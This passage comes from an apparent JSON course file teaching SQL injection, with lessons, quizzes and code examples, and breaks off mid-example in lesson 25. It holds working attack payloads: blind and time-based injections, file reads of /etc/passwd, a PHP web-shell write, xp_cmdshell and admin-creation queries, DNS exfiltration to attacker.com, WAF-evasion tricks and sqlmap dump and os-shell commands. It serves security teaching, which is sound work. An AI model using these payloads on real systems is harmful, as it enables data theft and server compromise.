                        "code": "# Is the current database version 13?\n'; SELECT CASE WHEN (SUBSTRING(version(),12,2)='13') THEN pg_sleep(5) ELSE pg_sleep(0) END--"
                    },
                    {
                        "title": "Time-Based Blind SQLi Payload (MSSQL)",
                        "language": "sql",
                        "code": "'; IF (SUBSTRING(DB_NAME(),1,1) = 'M') WAITFOR DELAY '0:0:5'--"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A time-based blind SQL injection attack relies on what?", "options": ["Seeing detailed error messages", "The application's response being observably different for a true condition vs. a false condition", "Observing a measurable delay in the HTTP response based on a conditional query", "Using the UNION operator"], "correct": 2, "explanation": "This technique uses time as the side channel to exfiltrate data when there is no other observable difference in the application's response." }
                    ]
                }
            },
            {
                "id": "lesson-9-mysql-injection",
                "title": "Lesson 9: MySQL Injection Techniques",
                "duration": "120 min",
                "objectives": [
                    "Exploit MySQL-specific functions and features",
                    "Extract data from the `information_schema` on MySQL",
                    "Read and write files to the server's file system using SQLi",
                    "Understand how to use User-Defined Functions (UDFs) for command execution"
                ],
                "content": {
                    "overview": "Every database has its own unique features and functions that can be abused by an attacker. This lesson focuses on techniques that are specific to MySQL, one of the most common database backends for web applications. We will explore how to abuse MySQL's features to read files and even gain command execution.",
                    "sections": [
                        {
                            "title": "File System Access",
                            "content": "<p>MySQL has built-in functions that, if the database user has the correct file permissions, can be used to read and write files on the underlying server. This can allow an attacker to escalate a SQLi vulnerability into a full server compromise.</p><ul><li><strong>`LOAD_FILE()`:</strong> This function can read a file from the local file system and return its contents as a string. An attacker can use this in a `UNION` statement to read any file that the database user can access (e.g., `/etc/passwd` or application configuration files).</li><li><strong>`INTO OUTFILE` / `INTO DUMPFILE`:</strong> This clause of a `SELECT` statement allows the output to be written to a new file on the server. An attacker can use this to write a web shell to a web-accessible directory, giving them Remote Code Execution.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Reading a File with `LOAD_FILE`",
                        "language": "http",
                        "code": "GET /products?id=-1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3-- -"
                    },
                    {
                        "title": "Writing a Web Shell with `INTO OUTFILE`",
                        "language": "http",
                        "code": "# This injects a simple PHP web shell into a file called shell.php in a web-accessible directory.\n# The attacker can then browse to shell.php to execute commands.\nGET /products?id=-1' UNION SELECT 1,\"<?php system($_GET['cmd']); ?>\",3 INTO OUTFILE '/var/www/html/uploads/shell.php'-- -"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In MySQL, what does the `LOAD_FILE()` function do?", "options": ["Loads a file from the user's computer", "Reads a file from the database server's local file system and returns its contents", "Writes a file to the server", "Loads a table into memory"], "correct": 1, "explanation": "This function is a powerful tool for an attacker, allowing them to read arbitrary files from the server, escalating the impact of the SQLi." },
                        { "id": 2, "question": "An attacker uses `INTO OUTFILE` to write a PHP file to the `/var/www/html/` directory. What is their likely goal?", "options": ["To deface the website", "To back up the database", "To create a web shell and achieve Remote Code Execution", "To read a system file"], "correct": 2, "explanation": "Writing a file containing server-side code (like a PHP web shell) to a directory where the web server will execute it is the classic method for escalating from SQLi to full command execution." }
                    ]
                }
            },
            {
                "id": "lesson-10-postgresql-injection",
                "title": "Lesson 10: PostgreSQL Injection Methods",
                "duration": "120 min",
                "objectives": [
                    "Exploit PostgreSQL-specific functions and data types",
                    "Extract the schema by querying the `pg_catalog` system tables",
                    "Abuse large object functions for file system access",
                    "Understand how to create custom, malicious functions for command execution"
                ],
                "content": {
                    "overview": "PostgreSQL is another extremely popular open-source database with its own rich feature set. This lesson covers the unique techniques for exploiting SQLi in a PostgreSQL backend, focusing on its different system catalog and built-in functions.",
                    "sections": [
                        {
                            "title": "System Catalog Exploitation",
                            "content": "<p>PostgreSQL does not use `information_schema` in the same way as MySQL. Its primary metadata is stored in the `pg_catalog` schema.</p><ul><li><strong>Finding Tables:</strong> An attacker can query `pg_catalog.pg_tables` to get a list of tables.</li><li><strong>Finding Columns:</strong> Querying `pg_catalog.pg_attribute` will reveal the column names for a given table.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Advanced Exploitation",
                            "content": "<p>PostgreSQL has a number of powerful features that can be abused.</p><ul><li><strong>Large Objects:</strong> PostgreSQL has a 'large object' facility for storing binary data. Functions for manipulating these can be abused to read and write files on the server.</li><li><strong>Custom Functions:</strong> An attacker with the right permissions can create a new function using a procedural language (like `PL/Pythonu`) that can execute operating system commands. They can then call this function to achieve RCE.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Instead of `information_schema`, the primary system catalog for discovering schema information in PostgreSQL is:", "options": ["`pg_schema`", "`pg_catalog`", "`information_catalog`", "`pg_admin`"], "correct": 1, "explanation": "Understanding how to query the `pg_catalog` is the key to information gathering during a PostgreSQL SQLi attack." }
                    ]
                }
            },
            {
                "id": "lesson-11-mssql-injection",
                "title": "Lesson 11: Microsoft SQL Server Injection",
                "duration": "120 min",
                "objectives": [
                    "Exploit features specific to Microsoft SQL Server (MSSQL)",
                    "Leverage stacked queries to execute multiple commands",
                    "Gain command execution through the `xp_cmdshell` extended stored procedure",
                    "Abuse linked servers to pivot to other databases"
                ],
                "content": {
                    "overview": "Microsoft SQL Server is the backbone of many enterprise Windows applications. Its deep integration with the Windows OS and its rich feature set provide a unique and powerful attack surface for an attacker who finds an SQLi vulnerability. This lesson covers the potent techniques specific to MSSQL.",
                    "sections": [
                        {
                            "title": "Stacked Queries",
                            "content": "<p>MSSQL supports 'stacked queries'. This means an attacker can use a semicolon (`;`) to terminate the original vulnerable query and then start a completely new one. This is an extremely powerful feature that is not available in many other databases like MySQL.</p>",
                            "image": "https://images.unsplash.com/photo-1638218151909-86641b4e4776?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "xp_cmdshell: The Holy Grail",
                            "content": "<p>`xp_cmdshell` is a infamous extended stored procedure in MSSQL that allows a database user to execute operating system commands directly from a SQL query. If the database user is highly privileged, these commands will run with the permissions of the SQL Server service account (often `NT AUTHORITY\\SYSTEM`). An attacker who can execute `xp_cmdshell` has full command execution on the server.</p>",
                            "image": "https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Using Stacked Queries to Create a User",
                        "language": "http",
                        "code": "# The attacker ends the first query with a semicolon and adds a new command to create a sysadmin user.\nGET /products?id=1; EXEC sp_addsrvrolemember 'newadmin', 'sysadmin'--"
                    },
                    {
                        "title": "Gaining a Command Shell with `xp_cmdshell`",
                        "language": "http",
                        "code": "# Note: xp_cmdshell is often disabled by default on modern versions, but an attacker may be\n# able to re-enable it if they have sufficient permissions.\nGET /products?id=1; EXEC master..xp_cmdshell 'whoami'--"
                    }
                ],
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary function of the `xp_cmdshell` extended stored procedure in MSSQL?", "options": ["To list all tables", "To execute operating system commands from within a SQL query", "To back up the database", "To create a new user"], "correct": 1, "explanation": "`xp_cmdshell` provides a direct bridge from the database to the underlying operating system, making it the primary target for attackers seeking Remote Code Execution." },
                        { "id": 2, "question": "The ability to use a semicolon to execute multiple, independent SQL statements in a single request is known as:", "options": ["UNION Injection", "Blind Injection", "Stacked Queries", "Error-Based Injection"], "correct": 2, "explanation": "Stacked queries are a powerful technique supported by some databases like MSSQL and PostgreSQL, but not by others like MySQL when used with the standard web APIs." }
                    ]
                }
            },
            {
                "id": "lesson-12-oracle-injection",
                "title": "Lesson 12: Oracle Database Injection",
                "duration": "120 min",
                "objectives": [
                    "Understand SQLi vulnerabilities specific to the Oracle database and its PL/SQL language",
                    "Abuse built-in system packages to exfiltrate data and interact with the system",
                    "Exploit Java and C stored procedures for command execution"
                ],
                "content": {
                    "overview": "Oracle is a titan of the enterprise database world. This lesson covers the specific techniques for exploiting SQL injection in an Oracle backend, focusing on its unique PL/SQL language, built-in packages, and its support for Java within the database.",
                    "sections": [
                        {
                            "title": "Oracle PL/SQL Injection",
                            "content": "<p>Oracle's procedural language is PL/SQL. Many vulnerabilities in Oracle-backed applications are due to the insecure use of dynamic SQL within these PL/SQL stored procedures. Oracle also has a very rich set of built-in packages that can be abused.</p><h3>Abusing Packages:</h3><ul><li><strong>`UTL_HTTP`:</strong> Can be used to make outbound HTTP requests from the database, enabling out-of-band SSRF and data exfiltration.</li><li><strong>`UTL_FILE`:</strong> Can be used to read and write files on the underlying file system, similar to MySQL's `LOAD_FILE`.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Java Stored Procedures for RCE",
                            "content": "<p>Oracle includes a built-in Java Virtual Machine. If an attacker has sufficient privileges, they can define and call their own malicious Java stored procedure. Since Java can execute operating system commands, this provides a direct path to Remote Code Execution on the database server.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The `UTL_HTTP` and `UTL_FILE` packages in Oracle can be abused by an attacker with an SQLi vulnerability to do what?", "options": ["Create new users", "Make outbound network requests and read/write local files", "Encrypt the database", "Drop a table"], "correct": 1, "explanation": "These powerful built-in packages are a common target for attackers, as they provide a direct way to exfiltrate data and interact with the underlying server." }
                    ]
                }
            },
            {
                "id": "lesson-13-second-order-sqli",
                "title": "Lesson 13: Second-Order SQL Injection",
                "duration": "120 min",
                "objectives": [
                    "Understand the multi-step nature of second-order attacks",
                    "Identify how benign-looking stored input can become malicious in a different context",
                    "Trace the flow of data through an application to find second-order vulnerabilities"
                ],
                "content": {
                    "overview": "Second-order SQLi is a subtle but powerful variant where the malicious payload lies dormant in the database until a different part of the application triggers it. This lesson provides a deep dive into the methodology for finding and exploiting these multi-step attack chains.",
                    "sections": [
                        {
                            "title": "The Attack Chain Explained",
                            "content": "<p>A second-order injection is a two-step attack:</p><ol><li><strong>Step 1 (The Plant):</strong> An attacker finds a feature that allows them to store data in the database. The `INSERT` or `UPDATE` query for this feature is perfectly secure and uses parameterized queries, so no injection happens here. The attacker stores a string that contains a malicious SQL payload. *Example:* An attacker creates an account with the username `admin'--`.</li><li><strong>Step 2 (The Trigger):</strong> A completely different and insecurely coded feature of the application later retrieves this malicious string. It then uses this string to build a new SQL query dynamically. For example, an administrative feature might look up a user's activity with an insecure query like `\"SELECT * FROM user_logs WHERE username = '\" + username + \"'\"`. When this query is built with the stored malicious username, the injection is triggered.</li></ol><p>These are difficult for automated scanners to find because they require understanding the flow of data through the entire application.</p>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why are second-order SQL injection vulnerabilities difficult to detect?", "options": ["They are not a real vulnerability", "Because the initial step of storing the malicious data appears harmless and does not trigger an error, and the vulnerable code is in a completely separate part of the application", "They can only be found with a WAF", "They only affect NoSQL databases"], "correct": 1, "explanation": "This separation of the 'injection' step from the 'execution' step makes it very hard for automated tools and casual code reviews to spot the vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-14-nosql-injection",
                "title": "Lesson 14: NoSQL Injection Attacks",
                "duration": "120 min",
                "objectives": [
                    "Understand how injection attacks manifest in NoSQL databases like MongoDB",
                    "Exploit NoSQL queries by injecting operators and control characters",
                    "Test for and defend against NoSQL injection vulnerabilities"
                ],
                "content": {
                    "overview": "NoSQL databases use a different query language and structure than SQL databases, but they are still susceptible to injection attacks if user input is not handled correctly. This lesson covers how injection vulnerabilities work in the context of a NoSQL database, primarily focusing on MongoDB.",
                    "sections": [
                        {
                            "title": "MongoDB Injection",
                            "content": "<p>Many MongoDB applications build queries by constructing a JSON or BSON object directly from user input. This can allow an attacker to inject NoSQL operators.</p><p>For example, a login form might expect a JSON object like `{\"username\": \"test\", \"password\": \"pwd\"}`. The backend might use this directly in a `find()` query.</p><p>An attacker could manipulate the POSTed JSON to be `{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}`. The `$ne` operator means 'not equal'. This might trick the database into finding the first user where the username and password are not null, bypassing authentication.</p>",
                            "image": "https://images.unsplash.com/photo-1628126781297-768a4e32d64f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "The root cause of NoSQL injection is similar to SQL injection. What is it?", "options": ["Using weak passwords", "A lack of a firewall", "Allowing user input to be interpreted as query operators or logic", "Not using encryption"], "correct": 2, "explanation": "Whether it's SQL or NoSQL, the fundamental flaw is the same: mixing untrusted user data with the application's query logic in a way that allows the data to alter the query's meaning." }
                    ]
                }
            },
            {
                "id": "lesson-15-out-of-band-sqli",
                "title": "Lesson 15: Advanced Blind Injection (Out-of-Band)",
                "duration": "120 min",
                "objectives": [
                    "Understand the concept of out-of-band (OOB) data exfiltration",
                    "Use database functions to trigger DNS lookups to an attacker-controlled server",
                    "Exfiltrate data by embedding it in the subdomains of DNS queries"
                ],
                "content": {
                    "overview": "This lesson covers the most advanced form of blind SQLi, used when there is absolutely no observable difference in the application's response (no error, no content change, no time delay). In this scenario, an attacker tricks the database into sending the data out over a completely different network channel, like DNS or HTTP.",
                    "sections": [
                        {
                            "title": "DNS Exfiltration",
                            "content": "<p>This is the classic OOB technique. Many databases have functions that can trigger network interactions.</p><h3>The Attack Flow:</h3><ol><li>The attacker registers a custom domain (`attacker.com`) and points its authoritative DNS server to a machine they control.</li><li>They inject a SQL query that concatenates a piece of data they want to steal (like the database username) with their domain name, and then passes this string to a function that will cause a DNS lookup.</li><li>The query might look like: `... OR (SELECT a FROM mytable WHERE id=1 LIMIT 1).attacker.com ...`</li><li>The database server will try to resolve the domain name `(the_secret_data).attacker.com`.</li><li>To do this, it will make a DNS query to the attacker's DNS server.</li><li>The attacker, watching their DNS server logs, will see the incoming query for `the_secret_data.attacker.com` and has successfully exfiltrated the data.</li></ol><p>This technique can be automated to extract entire databases, one subdomain at a time.</p>",
                            "image": "https://images.unsplash.com/photo-1585149420381-f13a0429a1b4?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the core principle of an out-of-band (OOB) SQL injection attack?", "options": ["To get the data back in the web page response", "To cause a time delay", "To trick the database into making a network connection to an attacker-controlled server, with the stolen data embedded in the request", "To delete the database"], "correct": 2, "explanation": "OOB techniques are necessary when there is no other information channel available from the web application. The attacker forces the database to open a new channel directly to them." }
                    ]
                }
            },
            {
                "id": "lesson-16-stored-procedure-injection",
                "title": "Lesson 16: Stored Procedure Injection",
                "duration": "120 min",
                "objectives": [
                    "Identify vulnerabilities in stored procedures that use dynamic SQL",
                    "Exploit stored procedures by manipulating their input parameters",
                    "Abuse system stored procedures for privilege escalation"
                ],
                "content": {
                    "overview": "Many developers believe that using stored procedures makes them immune to SQL injection. This is a dangerous myth. If a stored procedure itself constructs a dynamic SQL query by concatenating its input parameters, it is just as vulnerable as a client-side application. This lesson covers how to find and exploit these vulnerabilities.",
                    "sections": [
                        {
                            "title": "Dynamic SQL in Procedures",
                            "content": "<p>A stored procedure is just code that runs on the database server. If that code is insecure, it can be exploited.</p><p>For example, a stored procedure to search for products might take a search term as an input parameter. If it then builds a query like `EXEC('SELECT * FROM products WHERE name = ''' + @searchTerm + '''')`, it is vulnerable to the exact same SQLi techniques as a client-side application that does the same concatenation. The vulnerability is just one layer deeper.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Does using a stored procedure automatically prevent all SQL injection vulnerabilities?", "options": ["Yes, always", "No, if the stored procedure itself uses string concatenation to build a dynamic SQL query, it can be vulnerable", "Only on weekends", "Only if the database is MySQL"], "correct": 1, "explanation": "A stored procedure is not magic. Insecure coding practices are insecure whether they happen in application code or in database code." }
                    ]
                }
            },
            {
                "id": "lesson-17-waf-bypass",
                "title": "Lesson 17: WAF Bypass Techniques",
                "duration": "120 min",
                "objectives": [
                    "Understand how Web Application Firewalls (WAFs) use signatures to detect SQLi",
                    "Use comment-based and case variation techniques to evade simple filters",
                    "Leverage alternative syntax and encoding to bypass more advanced WAFs"
                ],
                "content": {
                    "overview": "Many applications are protected by a Web Application Firewall (WAF) that attempts to block common SQLi payloads. This lesson covers the cat-and-mouse game of WAF evasion, demonstrating the techniques attackers use to subtly modify their payloads to bypass these signature-based defenses.",
                    "sections": [
                        {
                            "title": "Bypass Techniques",
                            "content": "<p>WAFs often work by looking for keywords and patterns in the request, like `UNION SELECT` or `' OR '1'='1`. Attackers try to find ways to express the same logic in a way that the WAF's regular expression doesn't recognize.</p><h3>Common Techniques:</h3><ul><li><strong>Case Variation:</strong> A simple WAF might look for `union select`. An attacker might try `uNiOn sElEcT`.</li><li><strong>Comments as Obfuscation:</strong> An attacker can insert comments inside a keyword. For example, `UNION/* This is a comment */SELECT` might bypass a naive regex but is still valid SQL.</li><li><strong>Encoding:</strong> Using URL encoding or other character encodings to represent special characters.</li><li><strong>Alternative Syntax:</strong> Using different, less common SQL functions or syntax that accomplish the same goal but are not in the WAF's signature set.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1605379399642-870262d3d051?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why would an attacker try to inject `uNiOn sElEcT` instead of the standard `UNION SELECT`?", "options": ["It is easier to type", "To bypass a case-sensitive WAF filter that is only looking for the lowercase version", "It runs faster on the database", "It looks more professional"], "correct": 1, "explanation": "This is a simple but sometimes effective evasion technique against poorly written WAF signatures." }
                    ]
                }
            },
            {
                "id": "lesson-18-filter-evasion",
                "title": "Lesson 18: Filter Evasion Methods",
                "duration": "120 min",
                "objectives": [
                    "Bypass deny-list (blacklist) filters by finding unhandled syntax variations",
                    "Understand how to circumvent weaker allow-list (whitelist) filters",
                    "Use character set manipulation and different encodings to bypass filters"
                ],
                "content": {
                    "overview": "Beyond WAFs, some applications implement their own input filtering logic. This lesson provides a deeper dive into bypassing these custom-built filters, which are often less robust than a commercial WAF.",
                    "sections": [
                        {
                            "title": "Bypassing Deny-lists",
                            "content": "<p>A developer might create a deny-list that strips out the keyword `SELECT`. An attacker can often bypass this. For example, they might submit `SSELECTELECT`. If the application simply removes the first instance of 'SELECT', the remaining string is `SELECT`, and the bypass is successful. This highlights the fundamental weakness of deny-list filtering.</p>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is an 'allow-list' approach to input validation generally more secure than a 'deny-list'?", "options": ["It isn't, deny-lists are better", "An allow-list is much more restrictive; you only have to define what is good, and you can reject everything else. A deny-list requires you to perfectly anticipate every single possible bad input, which is nearly impossible.", "Allow-lists perform better", "Deny-lists are more expensive"], "correct": 1, "explanation": "The 'default deny' posture of an allow-list is a fundamental security design principle." }
                    ]
                }
            },
            {
                "id": "lesson-19-ids-ips-evasion",
                "title": "Lesson 19: IDS/IPS Evasion",
                "duration": "120 min",
                "objectives": [
                    "Understand how network-based Intrusion Detection/Prevention Systems (IDS/IPS) detect attacks",
                    "Use fragmentation and timing-based techniques to evade IDS/IPS signatures",
                    "Leverage protocol-level evasion to sneak attacks past a network sensor"
                ],
                "content": {
                    "overview": "This lesson moves to the network layer, covering techniques attackers use to hide their SQLi payloads from network-based security appliances like an IDS or IPS. These techniques focus on manipulating the network traffic itself to break the attack signature.",
                    "sections": [
                        {
                            "title": "Fragmentation",
                            "content": "<p>An attacker can break their malicious payload into many small packets. A simple IDS that is only inspecting individual packets might not see the full signature ('UNION SELECT'). A more advanced, stateful IPS is required to reassemble the full stream and find the attack, but even these can sometimes be evaded with advanced fragmentation techniques.</p>",
                            "image": "https://images.unsplash.com/photo-1599691888286-93e433f064b8?w=800&h=400&fit-crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a network-level evasion technique where an attacker breaks their payload into many small packets?", "options": ["Encoding", "Case variation", "Fragmentation", "Comments"], "correct": 2, "explanation": "Fragmentation is designed to defeat network-based signature matching by splitting the malicious string across multiple packets." }
                    ]
                }
            },
            {
                "id": "lesson-20-advanced-obfuscation",
                "title": "Lesson 20: Advanced Obfuscation",
                "duration": "120 min",
                "objectives": [
                    "Use advanced encoding and obfuscation techniques like concatenation and character code manipulation",
                    "Build polymorphic injection payloads that change on each request",
                    "Understand how to use dynamic query construction to evade detection"
                ],
                "content": {
                    "overview": "This lesson brings together all the evasion techniques into the concept of advanced obfuscation. The goal is to create a payload that is semantically identical to a normal attack payload, but syntactically unrecognizable to a security filter. We will explore how to build these complex, polymorphic payloads.",
                    "sections": [
                        {
                            "title": "Dynamic Query Construction",
                            "content": "<p>An attacker can use database functions to build up the malicious keywords they need. For example, instead of writing `SELECT`, they might write `CONCAT('S','E','L','E','C','T')`. The database will assemble this string into `SELECT` and execute it, but a WAF looking for the literal string `SELECT` would be bypassed.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "An attacker crafts a payload like `CONCAT(CHAR(83), CHAR(69), CHAR(76), ...)` to build the word `SELECT`. What is the purpose of this technique?", "options": ["To make the query more readable", "To obfuscate the payload and bypass a WAF or filter that is looking for the literal string 'SELECT'", "To perform a blind SQLi attack", "To encrypt the payload"], "correct": 1, "explanation": "This is a classic obfuscation technique that relies on the database's own functions to dynamically construct the malicious string at runtime, after it has already passed through the security filter." }
                    ]
                }
            },
            {
                "id": "lesson-21-data-extraction",
                "title": "Lesson 21: Data Extraction Techniques",
                "duration": "120 min",
                "objectives": [
                    "Systematically map a database schema using `information_schema` or equivalent",
                    "Identify tables and columns containing sensitive data",
                    "Use scripting and automation to perform bulk data exfiltration"
                ],
                "content": {
                    "overview": "With a confirmed SQLi vulnerability, the next phase is exploitation. This lesson covers the methodical process an attacker uses to map out the entire database and exfiltrate all the data they are interested in.",
                    "sections": [
                        {
                            "title": "Systematic Exfiltration",
                            "content": "<p>Once an attacker has a working `UNION` or blind injection, they will not extract data randomly. They follow a process:</p><ol><li>Get database version, user, and name.</li><li>Dump a list of all table names from `information_schema.tables`.</li><li>Dump a list of all column names for the interesting tables from `information_schema.columns`.</li><li>Finally, dump the actual data from the target tables and columns.</li></ol><p>This entire process can be automated with tools like SQLMap.</p>",
                            "image": "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the name of the popular, open-source tool that can automate the entire SQL injection exploitation process, from detection to data exfiltration?", "options": ["Nmap", "Metasploit", "Wireshark", "SQLMap"], "correct": 3, "explanation": "SQLMap is the de facto standard tool for automated SQLi exploitation and is a critical part of any penetration tester's toolkit." }
                    ]
                }
            },
            {
                "id": "lesson-22-privilege-escalation",
                "title": "Lesson 22: Privilege Escalation",
                "duration": "120 min",
                "objectives": [
                    "Escalate privileges within the database from a low-privilege user to a DBA",
                    "Leverage database vulnerabilities to escalate privileges",
                    "Abuse administrative functions to gain higher levels of access"
                ],
                "content": {
                    "overview": "The initial SQL injection vulnerability might be running in the context of a low-privilege web user. In this post-exploitation lesson, we cover techniques attackers use to escalate their privileges within the database itself, aiming to become a powerful user like a Database Administrator (DBA).",
                    "sections": [
                        {
                            "title": "Escalation Paths",
                            "content": "<p>An attacker will look for ways to move up the privilege ladder. This could involve finding vulnerabilities in the database software itself, or finding poorly configured stored procedures that run with higher privileges (`DEFINER` rights) that can be abused.</p>",
                            "image": "https://images.unsplash.com/photo-1516321497487-e288fb19713f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the goal of privilege escalation in a database context?", "options": ["To read a single file", "To elevate access from a low-privilege user (like a web app user) to a high-privilege one (like a DBA)", "To delete all data", "To write a report"], "correct": 1, "explanation": "Gaining DBA-level access gives an attacker complete control over the entire database." }
                    ]
                }
            },
            {
                "id": "lesson-23-file-system-access",
                "title": "Lesson 23: File System Access",
                "duration": "120 min",
                "objectives": [
                    "Use SQLi to read arbitrary files from the server's file system",
                    "Use SQLi to write a web shell to the server",
                    "Manipulate application logs or configuration files through the database"
                ],
                "content": {
                    "overview": "The ultimate goal for many attackers is to break out of the database and get a command shell on the underlying operating system. This post-exploitation lesson covers the techniques for using an SQLi vulnerability to interact with the server's file system.",
                    "sections": [
                        {
                            "title": "Escalating to RCE",
                            "content": "<p>As discussed in the database-specific lessons, many database engines have functions that can be used to read or write local files. An attacker with a confirmed SQLi and sufficient database user permissions will always attempt to use these.</p><h3>The Holy Grail: Web Shell</h3><p>The primary goal is often to use a function like MySQL's `INTO OUTFILE` to write a simple web shell (e.g., a one-line PHP script) into a directory that the web server can execute (like `/var/www/html/images/`). Once the web shell is written, the attacker can browse to that file and execute any operating system command they want, achieving full Remote Code Execution (RCE). The attack has now escalated beyond the database to a full server compromise.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "An attacker uses an SQLi vulnerability to write a PHP file to the web server's document root. What is this file likely to be?", "options": ["A backup of the database", "A configuration file", "A web shell", "An image file"], "correct": 2, "explanation": "A web shell is a piece of code that provides a command-and-control interface, allowing the attacker to execute shell commands on the server through their browser." }
                    ]
                }
            },
            {
                "id": "lesson-24-network-pivoting",
                "title": "Lesson 24: Network Pivoting from Database",
                "duration": "120 min",
                "objectives": [
                    "Use the compromised database server to scan the internal network",
                    "Leverage database features to move laterally to other systems",
                    "Exploit database link features (e.g., in MSSQL) to attack other databases"
                ],
                "content": {
                    "overview": "The compromised database server is often a trusted machine on an internal network. In this final post-exploitation lesson, we explore how an attacker can use this trusted position to 'pivot' and attack other, non-public systems on the internal corporate network.",
                    "sections": [
                        {
                            "title": "The Database as a Pivot Point",
                            "content": "<p>Once an attacker has command execution on the database server, they are no longer an external attacker; they are an insider. They can now use this machine to:</p><ul><li><strong>Scan the internal network:</strong> Use tools like Nmap to discover other servers, workstations, and network services that are not visible from the internet.</li><li><strong>Move Laterally:</strong> Exploit other vulnerabilities on internal systems to expand their foothold.</li><li><strong>Abuse Database Links:</strong> In databases like MSSQL or Oracle, an administrator can create 'linked servers'. If the compromised database has a link to another database (like the finance database), the attacker may be able to use that link to pivot their attack to the second database server.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is 'network pivoting' in the context of a database compromise?", "options": ["Backing up the database", "Using the compromised database server's trusted position on the internal network to launch attacks against other internal systems", "Changing a table's pivot point", "Writing a report about the network"], "correct": 1, "explanation": "Pivoting is the classic lateral movement technique where an attacker uses a compromised host to leapfrog to other, more sensitive parts of the network." }
                    ]
                }
            },
            {
                "id": "lesson-25-sqlmap-mastery",
                "title": "Lesson 25: SQLMap Mastery",
                "duration": "120 min",
                "objectives": [
                    "Use `sqlmap` to automate the entire SQLi detection and exploitation process",
                    "Master advanced `sqlmap` options for evasion, tuning, and specific database features",
                    "Write custom tamper scripts to bypass unique WAFs or filters",
                    "Integrate `sqlmap` into a broader penetration testing workflow"
                ],
                "content": {
                    "overview": "While manual exploitation is essential for understanding the fundamentals, real-world assessments rely heavily on automation. This lesson provides a masterclass on `sqlmap`, the open-source, de facto industry standard tool for automating SQL injection attacks. You will learn to move beyond the basics to master its advanced and powerful features.",
                    "sections": [
                        {
                            "title": "Advanced Usage and Options",
                            "content": "<p>Beyond a simple scan, `sqlmap` has hundreds of options for tailoring your attack.</p><h3>Key Advanced Options:</h3><ul><li><strong>`--tamper`:</strong> Use a tamper script to obfuscate your payloads to bypass WAFs. `sqlmap` comes with dozens of built-in scripts (e.g., `--tamper=space2comment`).</li><li><strong>`--os-shell`:</strong> Once you have confirmed a file write vulnerability, this option will attempt to automatically upload a web shell and give you an interactive command shell on the server.</li><li><strong>`--sql-shell`:</strong> Gives you a direct, interactive SQL shell on the backend database.</li><li><strong>`--level` and `--risk`:</strong> Increase these values (`--level=5 --risk=3`) to make `sqlmap` perform a much more comprehensive and aggressive set of tests, including time-based and more obscure database-specific checks.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "codeExamples": [
                    {
                        "title": "Standard `sqlmap` Scan to Dump Data",
                        "language": "bash",
                        "code": "# This command tells sqlmap to test the 'id' parameter at the given URL.\n# If it finds a vulnerability, it will then automatically dump the contents of the 'users' table from the 'myapp' database.\n\nsqlmap -u \"http://testphp.vulnweb.com/listproducts.php?cat=1\" -p cat --dbms=MySQL --level=5 --risk=3 -D appdb -T users --dump"
                    },
                    {
                        "title": "`sqlmap` for an OS Shell",
